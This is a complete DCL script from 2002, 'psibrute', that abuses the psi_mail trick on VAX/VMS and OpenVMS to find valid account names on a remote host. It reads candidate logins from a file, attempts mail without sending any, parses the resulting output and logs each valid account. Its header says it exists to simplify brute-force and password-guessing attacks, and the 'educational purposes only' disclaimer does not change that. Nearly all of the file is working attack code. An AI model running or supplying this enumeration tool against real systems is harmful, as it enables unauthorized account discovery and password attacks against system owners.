$!
$! $Id: psibrute.com,v 1.1 2002/10/11 20:00:57 raptor Exp $
$!
$! psibrute v1.0 - VAX/VMS psi_mail remote bruteforcer
$! Copyright (c) 2002 Raptor <raptor@0xdeadbeef.info>
$!
$! PSIBRUTE abuses the old but still effective psi_mail 
$! trick on VAX/VMS systems to remotely find valid 
$! accounts. It can really simplify bruteforce and/or
$! password-guessing attacks (sending no real mail).
$!
$! Usage: @psibrute <account_file> [<remote_address>]
$! Example: @psibrute vax.txt psi%0208057040540
$!
$! Tested on VAX/VMS V5.5 and OpenVMS V7.2.
$!
$! FOR EDUCATIONAL PURPOSES ONLY.
$! 
$
$! Definitions
$ we :== write sys$error
$
$! Parameters and files
$ if P1 .eqs. "" then goto syntax
$ if P2 .eqs. "" then P2 = 0
$ open/read list 'P1'
$ crea psi.tmp
$ open/write log psi.log
$
$ we ""
$ we "*** PSI_BRUTE scanner for VAX/VMS ***"
$ we ""
$
$! Main loop
$ loop:
$ on error then continue
$ on severe_error then continue
$ read list login/end=cleanup
$ define/nolog/user_mode sys$output psi.out
$! We can't simply use "on warning" statement
$! because we don't want to send any real mail
$ mail psi.tmp "NOSUCHUSR", 'P2'::'login'
$
$! A nice trick (2 reads are better than 1)
$ define/nolog/user_mode sys$output sys$error
$ open/read output psi.out
$ read output out
$ read output out/end=found
$ we "[ ] ", login, " is not valid..."
$
$ closeout:
$ close output
$ del psi.out;*
$ goto loop
$
$ found:
$ write log login
$ we "[x] ", login, " is VALID for host ", P2, " !"
$ goto closeout
$
$ cleanup:
$ close list
$ close log 
$ del psi.tmp;*
$ we ""
$ we "*** End of remote bruteforce scan ***"
$ we ""
$ exit
$
$ syntax:
$ we "%PSI_BRUTE, error; syntax: @psibrute <account_file> [<remote_address>]"
